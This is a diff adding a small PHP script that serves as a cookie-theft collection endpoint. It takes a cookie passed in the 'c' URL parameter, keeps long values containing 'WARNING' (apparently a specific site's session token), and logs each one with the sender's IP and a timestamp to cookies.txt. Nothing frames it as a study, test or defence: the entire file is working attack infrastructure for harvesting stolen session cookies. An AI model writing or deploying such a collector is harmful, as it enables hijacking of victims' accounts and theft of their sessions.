@@ -1,0 +1,9 @@
+<?php
+$cookie = $_GET['c'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'];
+$time = date("d.m H:i:s");
+if(strlen($cookie) > 300 && strpos($cookie,'WARNING') !== false){
+    $line = "[$time] IP: $ip | $cookie\n\n";
+    file_put_contents("cookies.txt", $line, FILE_APPEND | LOCK_EX);
+}
+?>
